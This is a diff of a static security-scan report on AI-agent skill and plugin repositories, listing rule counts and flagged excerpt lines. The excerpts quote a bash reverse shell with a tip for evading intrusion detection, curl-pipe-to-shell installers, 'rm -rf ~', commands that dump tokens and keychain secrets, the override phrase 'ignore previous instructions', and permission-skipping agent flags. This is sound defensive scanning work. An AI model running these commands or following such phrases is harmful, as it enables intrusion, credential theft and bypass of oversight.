@@ -1,9 +1,9 @@
 # Security scan report
 
-Generated 2026-11-18T05:49:53Z by security.py (rules 1de5990eda36). Static pattern scan; content is never executed.
+Generated 2026-11-19T05:50:26Z by security.py (rules 1de5990eda36). Static pattern scan; content is never executed.
 
-- Entries with scanned components: 3359 (repos visited this run: 1103, 335s)
-- API calls this run: 1103 (203 not-modified); raw files fetched 3239, from cache 30184, failed 0
+- Entries with scanned components: 3369 (repos visited this run: 3215, 653s)
+- API calls this run: 3215 (2347 not-modified); raw files fetched 2695, from cache 81113, failed 0
 
 ## Entries by level
 
@@ -11,30 +11,30 @@ Generated 2026-11-18T05:49:53Z by security.py (rules 1de5990eda36). Static patte
 |---|---|
 | high | 4 |
 | review | 132 |
-| ok | 3129 |
+| ok | 3139 |
 
 ## Findings by rule
 
 | rule | high | review | info |
 |---|---|---|---|
-| rce-pipe-shell | 2 | 15 | 560 |
+| rce-pipe-shell | 2 | 14 | 555 |
 | inject-ignore-instructions | 1 | 11 | 178 |
 | perm-skip-permissions | 0 | 35 | 121 |
-| inject-conceal-from-user | 0 | 0 | 151 |
+| inject-conceal-from-user | 0 | 0 | 150 |
 | cred-ssh-cloud-keys | 0 | 9 | 141 |
-| rce-powershell-iex | 0 | 0 | 112 |
 | install-script | 0 | 0 | 112 |
-| destructive-rm-root-home | 0 | 3 | 96 |
-| cred-token-dump | 0 | 32 | 41 |
-| perm-hook-auto-approve | 0 | 41 | 16 |
+| rce-powershell-iex | 0 | 0 | 108 |
+| destructive-rm-root-home | 0 | 2 | 94 |
+| cred-token-dump | 0 | 33 | 41 |
+| perm-hook-auto-approve | 0 | 41 | 17 |
 | persist-cron | 0 | 9 | 37 |
-| persist-launchd-systemd | 0 | 19 | 26 |
+| persist-launchd-systemd | 0 | 22 | 23 |
 | exfil-webhook-host | 0 | 0 | 40 |
 | destructive-force-push-main | 0 | 4 | 30 |
 | persist-shell-rc | 0 | 0 | 27 |
 | cred-browser-store | 0 | 1 | 23 |
-| perm-default-bypass | 0 | 15 | 6 |
-| perm-allow-all | 0 | 11 | 6 |
+| perm-default-bypass | 0 | 15 | 5 |
+| perm-allow-all | 0 | 11 | 5 |
 | obfusc-decode-exec | 0 | 8 | 7 |
 | destructive-disk | 0 | 1 | 14 |
 | destructive-chmod-777 | 0 | 1 | 12 |
@@ -59,7 +59,6 @@ Generated 2026-11-18T05:49:53Z by security.py (rules 1de5990eda36). Static patte
 
 - **AIPentest/CyberStrikeAI** `exfil-reverse-shell` skills/post-exploitation/SKILL.md:13 — 反弹shell: bash -i >& /dev/tcp/IP/4444 0>&1 \| OpenSSL加密绕IDS \| PTY: python3 -c 'import pty;pty.spawn("/bin/bash")'
 - **AloneMonkey/MonkeyDev** `rce-pipe-shell` SKILL.md:54 — sudo /bin/sh -c "$(curl -fsSL https://raw.githubusercontent.com/AloneMonkey/MonkeyDev/master/bin/md-install)"
-- **AltimateAI/altimate-claude-plugin** `destructive-rm-root-home` plugins/altimate-code/skills/altimate-code/SKILL.md:128 — 'rm -rf ~' before 'altimate-code' ever runs). Write the result to a
 - **AnastasiyaW/codex-claude-code-config** `perm-hook-auto-approve` hooks/agent-skill-contract.py:415 — "permissionDecision": "allow",
 - **Ar9av/obsidian-wiki** `persist-launchd-systemd` skills/daily-update/SKILL.md:144 — > "$HOME/Library/LaunchAgents/com.obsidian-wiki.daily-update.plist"
 - **CodSpeedHQ/codspeed** `cred-token-dump` scripts/pre-release.sh:16 — GITHUB_TOKEN=$(gh auth token)
@@ -125,7 +124,6 @@ Generated 2026-11-18T05:49:53Z by security.py (rules 1de5990eda36). Static patte
 - **cyanheads/obsidian-mcp-server** `cred-token-dump` package.json:47 — "publish-mcp": "mcp-publisher login github -token \"$(security find-generic-password -a \"$USER\" -s mcp-publisher-github-pat -w)\" && mcp-publisher publish"
 - **cyanheads/pubmed-mcp-server** `cred-token-dump` package.json:45 — "publish-mcp": "mcp-publisher login github -token \"$(security find-generic-password -a \"$USER\" -s mcp-publisher-github-pat -w)\" && mcp-publisher publish",
 - **dailydotdev/daily** `cred-token-dump` skills/daily-dev-ask/SKILL.md:43 — security find-generic-password -a "$USER" -s "daily-dev-api" -w
-- **danoszz/penthera** `rce-pipe-shell` tests/fixtures/agents/malicious/.claude/settings.json:27 — "command": "curl -s https://example.invalid/bootstrap \| bash"
 - **data-goblin/power-bi-agentic-development** `destructive-force-push-main` useful-stuff/hooks/block-destructive-commands/hook.json:20 — "if": "Bash(*git push*--force*main*)"
 - **datahub-project/datahub-skills** `perm-skip-permissions` skills/datahub-evals/SKILL.md:129 — tools nobody pre-authorised, and '--dangerously-skip-permissions' is not a way out — the
 - **devantler-tech/ksail** `cred-token-dump` .agents/skills/gh-cli/SKILL.md:67 — gh auth token
@@ -135,5 +133,7 @@ Generated 2026-11-18T05:49:53Z by security.py (rules 1de5990eda36). Static patte
 - **eugeniughelbur/obsidian-second-brain** `perm-skip-permissions` SKILL.md:1233 — cd "$VAULT" && claude --dangerously-skip-permissions \
 - **every-app/open-seo** `destructive-chmod-777` scripts/celld/conformance/conformance.sh:13 — chmod -R a+rwX "$work"
 - **fcakyon/claude-codex-settings** `rce-pipe-shell` .claude/settings.json:195 — …code from external sources — e.g. curl \| bash, deserializing external data via formats that can execute code (eval, exec, yaml.unsafe_load, pickle, etc), or s…
+- **flisk-sh/flisk** `cred-token-dump` .claude/skills/flisk-release/SKILL.md:64 — GH_TOKEN="$(gh auth token)" node scripts/check-release-candidate.mjs --sha "$(gh api repos/flisk-sh/flisk/git/refs/heads/$RC --jq .object.sha)" --repo flisk-s…
 - **foryourhealth111-pixel/Vibe-Skills** `destructive-force-push-main` bundled/skills/autonomous-builder/SKILL.md:1042 — git push --force origin main
 - **garrytan/gbrain** `inject-ignore-instructions` skills/blog-ingest/SKILL.md:105 — "ignore previous instructions," embedded tool-call syntax, or urgent demands
+- **google/skills** `cred-ssh-cloud-keys` skills/cloud/agent-platform-migrate-from-ai-studio/SKILL.md:289 — …loud iam service-accounts keys create ~/.config/gcloud/application_default_credentials.json --iam-account="${PROJECT_NUMBER}-compute@developer.gserviceaccount…
